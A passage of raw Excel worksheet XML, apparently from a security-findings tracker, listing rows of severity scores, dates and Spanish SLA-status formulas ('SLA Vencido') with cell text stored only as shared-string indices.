        <v>326</v>
      </c>
      <c r="V489" s="1">
        <f t="shared" si="26"/>
        <v>45973</v>
      </c>
      <c r="W489" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB489" t="s">
        <v>1838</v>
      </c>
      <c r="AC489" t="s">
        <v>1839</v>
      </c>
      <c r="AE489" s="81" t="s">
        <v>3463</v>
      </c>
      <c r="AG489" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="490" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A490" s="5">
        <v>489</v>
      </c>
      <c r="B490" t="s">
        <v>32</v>
      </c>
      <c r="C490" t="s">
        <v>33</v>
      </c>
      <c r="D490" t="s">
        <v>34</v>
      </c>
      <c r="G490" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="I490" t="s">
        <v>1840</v>
      </c>
      <c r="J490" t="s">
        <v>1760</v>
      </c>
      <c r="L490" t="s">
        <v>141</v>
      </c>
      <c r="M490" t="s">
        <v>111</v>
      </c>
      <c r="N490">
        <v>3</v>
      </c>
      <c r="Q490" t="s">
        <v>1820</v>
      </c>
      <c r="T490" s="1">
        <v>45883</v>
      </c>
      <c r="U490" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>326</v>
      </c>
      <c r="V490" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W490" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB490" s="65" t="s">
        <v>1761</v>
      </c>
      <c r="AC490" s="65" t="s">
        <v>1841</v>
      </c>
      <c r="AD490" t="s">
        <v>1842</v>
      </c>
      <c r="AE490" s="81">
        <v>45921</v>
      </c>
      <c r="AG490" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="491" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A491" s="5">
        <v>490</v>
      </c>
      <c r="B491" t="s">
        <v>32</v>
      </c>
      <c r="C491" t="s">
        <v>225</v>
      </c>
      <c r="D491" t="s">
        <v>34</v>
      </c>
      <c r="G491" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H491" s="83" t="s">
        <v>1843</v>
      </c>
      <c r="J491" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L491" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M491" t="s">
        <v>522</v>
      </c>
      <c r="N491">
        <v>7.5</v>
      </c>
      <c r="Q491" s="83" t="s">
        <v>1845</v>
      </c>
      <c r="T491" s="1">
        <v>45906</v>
      </c>
      <c r="U491" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>303</v>
      </c>
      <c r="V491" s="1">
        <f t="shared" si="26"/>
        <v>45936</v>
      </c>
      <c r="W491" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB491" t="s">
        <v>1846</v>
      </c>
      <c r="AC491" t="s">
        <v>1847</v>
      </c>
      <c r="AD491" t="s">
        <v>1848</v>
      </c>
      <c r="AE491" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG491" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="492" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A492" s="5">
        <v>491</v>
      </c>
      <c r="B492" t="s">
        <v>32</v>
      </c>
      <c r="C492" t="s">
        <v>225</v>
      </c>
      <c r="D492" t="s">
        <v>34</v>
      </c>
      <c r="G492" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H492" t="s">
        <v>1849</v>
      </c>
      <c r="J492" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L492" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M492" t="s">
        <v>522</v>
      </c>
      <c r="N492">
        <v>7.5</v>
      </c>
      <c r="Q492" s="83" t="s">
        <v>1850</v>
      </c>
      <c r="T492" s="1">
        <v>45906</v>
      </c>
      <c r="U492" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>303</v>
      </c>
      <c r="V492" s="1">
        <f t="shared" si="26"/>
        <v>45936</v>
      </c>
      <c r="W492" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB492" t="s">
        <v>1846</v>
      </c>
      <c r="AC492" t="s">
        <v>1851</v>
      </c>
      <c r="AD492" t="s">
        <v>1848</v>
      </c>
      <c r="AE492" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG492" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="493" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A493" s="5">
        <v>492</v>
      </c>
      <c r="B493" t="s">
        <v>32</v>
      </c>
      <c r="C493" t="s">
        <v>225</v>
      </c>
      <c r="D493" t="s">
        <v>34</v>
      </c>
      <c r="G493" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H493" s="83" t="s">
        <v>1852</v>
      </c>
      <c r="J493" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L493" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M493" t="s">
        <v>522</v>
      </c>
      <c r="N493">
        <v>7.5</v>
      </c>
      <c r="Q493" s="83" t="s">
        <v>1853</v>
      </c>
      <c r="T493" s="1">
        <v>45906</v>
      </c>
      <c r="U493" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>303</v>
      </c>
      <c r="V493" s="1">
        <f t="shared" si="26"/>
        <v>45936</v>
      </c>
      <c r="W493" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB493" t="s">
        <v>1846</v>
      </c>
      <c r="AC493" t="s">
        <v>1854</v>
      </c>
      <c r="AD493" t="s">
        <v>1848</v>
      </c>
      <c r="AE493" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG493" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="494" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A494" s="5">
        <v>493</v>
      </c>
      <c r="B494" t="s">
        <v>32</v>
      </c>
      <c r="C494" t="s">
        <v>225</v>
      </c>
      <c r="D494" t="s">
        <v>34</v>
      </c>
      <c r="G494" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H494" s="83" t="s">
        <v>1855</v>
      </c>
      <c r="J494" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L494" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M494" t="s">
        <v>522</v>
      </c>
      <c r="N494">
        <v>7.5</v>
      </c>
      <c r="Q494" s="83" t="s">
        <v>1856</v>
      </c>
      <c r="T494" s="1">
        <v>45906</v>
      </c>
      <c r="U494" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>303</v>
      </c>
      <c r="V494" s="1">
        <f t="shared" si="26"/>
        <v>45936</v>
      </c>
      <c r="W494" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB494" t="s">
        <v>1846</v>
      </c>
      <c r="AC494" t="s">
        <v>1857</v>
      </c>
      <c r="AD494" t="s">
        <v>1848</v>
      </c>
      <c r="AE494" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG494" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="495" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A495" s="5">
        <v>494</v>
      </c>
      <c r="B495" t="s">
        <v>32</v>
      </c>
      <c r="C495" t="s">
        <v>225</v>
      </c>
      <c r="D495" t="s">
        <v>34</v>
      </c>
      <c r="G495" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H495" s="83" t="s">
        <v>1858</v>
      </c>
      <c r="J495" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L495" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M495" t="s">
        <v>522</v>
      </c>
      <c r="N495">
        <v>7.5</v>
      </c>
      <c r="Q495" s="83" t="s">
        <v>1859</v>
      </c>
      <c r="T495" s="1">
        <v>45906</v>
      </c>
      <c r="U495" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>303</v>
      </c>
      <c r="V495" s="1">
        <f t="shared" si="26"/>
        <v>45936</v>
      </c>
      <c r="W495" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB495" t="s">
        <v>1846</v>
      </c>
      <c r="AC495" t="s">
        <v>1860</v>
      </c>
      <c r="AD495" t="s">
        <v>1848</v>
      </c>
      <c r="AE495" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG495" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="496" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A496" s="5">
        <v>495</v>
      </c>
      <c r="B496" t="s">
        <v>32</v>
      </c>
      <c r="C496" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D496" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G496" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H496" t="s">
        <v>1861</v>
      </c>
      <c r="I496" t="s">
        <v>1862</v>
      </c>
      <c r="J496" t="s">
        <v>1863</v>
      </c>
      <c r="L496" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M496" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N496">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q496" t="s">
        <v>1864</v>
      </c>
      <c r="T496" s="75">
        <v>45833</v>
      </c>
      <c r="U496" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>376</v>
      </c>
      <c r="V496" s="78">
        <f t="shared" si="26"/>
        <v>45923</v>
      </c>
      <c r="W496" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB496" s="73" t="s">
        <v>1865</v>
      </c>
      <c r="AC496" s="73" t="s">
        <v>1866</v>
      </c>
      <c r="AD496" s="73" t="s">
        <v>1867</v>
      </c>
      <c r="AE496" s="81">
        <v>45915</v>
      </c>
      <c r="AG496" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="497" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A497" s="5">
        <v>496</v>
      </c>
      <c r="B497" t="s">
        <v>32</v>
      </c>
      <c r="C497" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D497" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G497" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H497" t="s">
        <v>1868</v>
      </c>
      <c r="I497" t="s">
        <v>1869</v>
      </c>
      <c r="J497" t="s">
        <v>1863</v>
      </c>
      <c r="L497" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M497" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N497">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q497" t="s">
        <v>1864</v>
      </c>
      <c r="T497" s="75">
        <v>45833</v>
      </c>
      <c r="U497" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>376</v>
      </c>
      <c r="V497" s="78">
        <f t="shared" si="26"/>
        <v>45923</v>
      </c>
      <c r="W497" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB497" s="73" t="s">
        <v>1870</v>
      </c>
      <c r="AC497" s="73" t="s">
        <v>1871</v>
      </c>
      <c r="AD497" s="73" t="s">
        <v>1872</v>
      </c>
      <c r="AE497" s="81">
        <v>45915</v>
      </c>
      <c r="AG497" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="498" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A498" s="5">
        <v>497</v>
      </c>
      <c r="B498" t="s">
        <v>32</v>
      </c>
      <c r="C498" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D498" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G498" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H498" t="s">
        <v>1873</v>
      </c>
      <c r="I498" t="s">
        <v>1874</v>
      </c>
      <c r="J498" t="s">
        <v>1875</v>
      </c>
      <c r="L498" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M498" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N498">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q498" t="s">
        <v>1864</v>
      </c>
      <c r="T498" s="75">
        <v>45833</v>
      </c>
      <c r="U498" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>376</v>
      </c>
      <c r="V498" s="78">
        <f t="shared" si="26"/>
        <v>45923</v>
      </c>
      <c r="W498" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB498" s="73" t="s">
        <v>1876</v>
      </c>
      <c r="AC498" s="73" t="s">
        <v>1877</v>
      </c>
      <c r="AD498" s="73" t="s">
        <v>1878</v>
      </c>
      <c r="AE498" s="81">
        <v>45915</v>
      </c>
      <c r="AG498" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="499" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A499" s="5">
        <v>498</v>
      </c>
      <c r="B499" t="s">
        <v>32</v>
      </c>
      <c r="C499" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D499" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G499" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H499" t="s">
        <v>1880</v>
      </c>
      <c r="J499" t="s">
        <v>574</v>
      </c>
      <c r="L499" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M499" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N499">
        <v>5.3</v>
      </c>
      <c r="Q499" t="s">
        <v>1796</v>
      </c>
      <c r="T499" s="1">
        <v>45913</v>
      </c>
      <c r="U499" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V499" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W499" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB499" t="s">
        <v>1881</v>
      </c>
      <c r="AC499" t="s">
        <v>1882</v>
      </c>
      <c r="AG499" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="500" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A500" s="5">
        <v>499</v>
      </c>
      <c r="B500" t="s">
        <v>32</v>
      </c>
      <c r="C500" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D500" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G500" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H500" t="s">
        <v>1883</v>
      </c>
      <c r="J500" t="s">
        <v>1325</v>
      </c>
      <c r="L500" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M500" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N500">
        <v>5.3</v>
      </c>
      <c r="Q500" t="s">
        <v>1796</v>
      </c>
      <c r="T500" s="1">
        <v>45913</v>
      </c>
      <c r="U500" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V500" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W500" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB500" t="s">
        <v>1884</v>
      </c>
      <c r="AC500" t="s">
        <v>1885</v>
      </c>
      <c r="AG500" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="501" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A501" s="5">
        <v>500</v>
      </c>
      <c r="B501" t="s">
        <v>32</v>
      </c>
      <c r="C501" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D501" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G501" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H501" t="s">
        <v>1886</v>
      </c>
      <c r="J501" t="s">
        <v>574</v>
      </c>
      <c r="L501" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M501" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N501">
        <v>5.3</v>
      </c>
      <c r="Q501" t="s">
        <v>1796</v>
      </c>
      <c r="T501" s="1">
        <v>45913</v>
      </c>
      <c r="U501" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V501" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W501" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB501" t="s">
        <v>1887</v>
      </c>
      <c r="AC501" t="s">
        <v>1888</v>
      </c>
      <c r="AG501" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="502" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A502" s="5">
        <v>501</v>
      </c>
      <c r="B502" t="s">
        <v>32</v>
      </c>
      <c r="C502" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D502" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G502" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H502" t="s">
        <v>1889</v>
      </c>
      <c r="J502" t="s">
        <v>1325</v>
      </c>
      <c r="L502" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M502" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N502">
        <v>5.3</v>
      </c>
      <c r="Q502" t="s">
        <v>1796</v>
      </c>
      <c r="T502" s="1">
        <v>45913</v>
      </c>
      <c r="U502" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V502" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W502" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB502" t="s">
        <v>1890</v>
      </c>
      <c r="AC502" t="s">
        <v>1891</v>
      </c>
      <c r="AG502" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="503" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A503" s="5">
        <v>502</v>
      </c>
      <c r="B503" t="s">
        <v>32</v>
      </c>
      <c r="C503" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D503" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G503" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H503" t="s">
        <v>1892</v>
      </c>
      <c r="J503" t="s">
        <v>574</v>
      </c>
      <c r="L503" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M503" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N503">
        <v>5.3</v>
      </c>
      <c r="Q503" t="s">
        <v>1796</v>
      </c>
      <c r="T503" s="1">
        <v>45913</v>
      </c>
      <c r="U503" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V503" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W503" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB503" t="s">
        <v>1893</v>
      </c>
      <c r="AC503" t="s">
        <v>1790</v>
      </c>
      <c r="AG503" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="504" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A504" s="5">
        <v>503</v>
      </c>
      <c r="B504" t="s">
        <v>32</v>
      </c>
      <c r="C504" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D504" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G504" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H504" t="s">
        <v>1894</v>
      </c>
      <c r="J504" t="s">
        <v>1325</v>
      </c>
      <c r="L504" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M504" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N504">
        <v>5.3</v>
      </c>
      <c r="Q504" t="s">
        <v>1796</v>
      </c>
      <c r="T504" s="1">
        <v>45913</v>
      </c>
      <c r="U504" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V504" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W504" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB504" t="s">
        <v>1893</v>
      </c>
      <c r="AC504" t="s">
        <v>1790</v>
      </c>
      <c r="AG504" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="505" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A505" s="5">
        <v>504</v>
      </c>
      <c r="B505" t="s">
        <v>32</v>
      </c>
      <c r="C505" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D505" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G505" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H505" t="s">
        <v>1895</v>
      </c>
      <c r="J505" t="s">
        <v>574</v>
      </c>
      <c r="L505" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M505" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N505">
        <v>5.3</v>
      </c>
      <c r="Q505" t="s">
        <v>1796</v>
      </c>
      <c r="T505" s="1">
        <v>45913</v>
      </c>
      <c r="U505" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V505" s="1">
        <f t="shared" si="26"/>
        <v>46003</v>
      </c>
      <c r="W505" s="76" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB505" t="s">
        <v>1896</v>
      </c>
      <c r="AC505" t="s">
        <v>1794</v>
      </c>
      <c r="AG505" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="506" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A506" s="5">
        <v>505</v>
      </c>
      <c r="B506" t="s">
        <v>32</v>
      </c>
      <c r="C506" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D506" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G506" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H506" t="s">
        <v>1897</v>
      </c>
      <c r="J506" t="s">
        <v>1325</v>
      </c>
      <c r="L506" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M506" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N506">
        <v>5.3</v>
      </c>
      <c r="Q506" t="s">
        <v>1796</v>
      </c>
      <c r="T506" s="1">
        <v>45913</v>
      </c>
      <c r="U506" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V506" s="1">
        <f t="shared" ref="V506:V537" si="28">IF(M506="Critical",T506+10,IF(M506="High",T506+30,IF(M506="Bad",T506+30,IF(M506="Medium",T506+90,IF(M506="Warm",T506+90,IF(M506="Low",T506+120,IF(M506="Fair",T506+120,IF(M506="Neutral",T506+120,""))))))))</f>
        <v>46003</v>
      </c>
      <c r="W506" s="76" t="str">
        <f t="shared" ref="W506:W537" ca="1" si="29">IF(M506="Critical",IF(U506&gt;10,"SLA Vencido","En SLA"),IF(M506="High",IF(U506&gt;30,"SLA Vencido","En SLA"),IF(M506="Bad",IF(U506&gt;30,"SLA Vencido","En SLA"),IF(M506="Medium",IF(U506&gt;90,"SLA Vencido","En SLA"),IF(M506="Warm",IF(U506&gt;90,"SLA Vencido","En SLA"),IF(M506="Low",IF(U506&gt;120,"SLA Vencido","En SLA"),IF(M506="Fair",IF(U506&gt;120,"SLA Vencido","En SLA"),IF(M506="Neutral",IF(U506&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB506" t="s">
        <v>1893</v>
      </c>
      <c r="AC506" t="s">
        <v>1790</v>
      </c>
      <c r="AG506" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="507" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A507" s="5">
        <v>506</v>
      </c>
      <c r="B507" t="s">
        <v>32</v>
      </c>
      <c r="C507" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D507" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G507" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H507" t="s">
        <v>1898</v>
      </c>
      <c r="J507" t="s">
        <v>574</v>
      </c>
      <c r="L507" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M507" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N507">
        <v>5.3</v>
      </c>
      <c r="Q507" t="s">
        <v>1796</v>
      </c>
      <c r="T507" s="1">
        <v>45913</v>
      </c>
      <c r="U507" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V507" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W507" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB507" t="s">
        <v>1896</v>
      </c>
      <c r="AC507" t="s">
        <v>1794</v>
      </c>
      <c r="AG507" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="508" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A508" s="5">
        <v>507</v>
      </c>
      <c r="B508" t="s">
        <v>32</v>
      </c>
      <c r="C508" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D508" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G508" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H508" t="s">
        <v>1899</v>
      </c>
      <c r="J508" t="s">
        <v>1325</v>
      </c>
      <c r="L508" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M508" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N508">
        <v>5.3</v>
      </c>
      <c r="Q508" t="s">
        <v>1796</v>
      </c>
      <c r="T508" s="1">
        <v>45913</v>
      </c>
      <c r="U508" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V508" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W508" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB508" t="s">
        <v>1893</v>
      </c>
      <c r="AC508" t="s">
        <v>1790</v>
      </c>
      <c r="AG508" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="509" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A509" s="5">
        <v>508</v>
      </c>
      <c r="B509" t="s">
        <v>32</v>
      </c>
      <c r="C509" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D509" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G509" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H509" t="s">
        <v>1900</v>
      </c>
      <c r="J509" t="s">
        <v>574</v>
      </c>
      <c r="L509" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M509" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N509">
        <v>5.3</v>
      </c>
      <c r="Q509" t="s">
        <v>1796</v>
      </c>
      <c r="T509" s="1">
        <v>45913</v>
      </c>
      <c r="U509" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V509" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W509" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB509" t="s">
        <v>1896</v>
      </c>
      <c r="AC509" t="s">
        <v>1794</v>
      </c>
      <c r="AG509" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="510" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A510" s="5">
        <v>509</v>
      </c>
      <c r="B510" t="s">
        <v>32</v>
      </c>
      <c r="C510" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D510" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G510" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H510" t="s">
        <v>1901</v>
      </c>
      <c r="J510" t="s">
        <v>1325</v>
      </c>
      <c r="L510" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M510" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N510">
        <v>5.3</v>
      </c>
      <c r="Q510" t="s">
        <v>1796</v>
      </c>
      <c r="T510" s="1">
        <v>45913</v>
      </c>
      <c r="U510" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V510" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W510" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB510" t="s">
        <v>1893</v>
      </c>
      <c r="AC510" t="s">
        <v>1790</v>
      </c>
      <c r="AG510" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="511" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A511" s="5">
        <v>510</v>
      </c>
      <c r="B511" t="s">
        <v>32</v>
      </c>
      <c r="C511" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D511" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G511" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H511" t="s">
        <v>1902</v>
      </c>
      <c r="J511" t="s">
        <v>574</v>
      </c>
      <c r="L511" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M511" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N511">
        <v>5.3</v>
      </c>
      <c r="Q511" t="s">
        <v>1796</v>
      </c>
      <c r="T511" s="1">
        <v>45913</v>
      </c>
      <c r="U511" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V511" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W511" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB511" t="s">
        <v>1896</v>
      </c>
      <c r="AC511" t="s">
        <v>1794</v>
      </c>
      <c r="AG511" s="51" t="s">
        <v>149</v>
      </c>
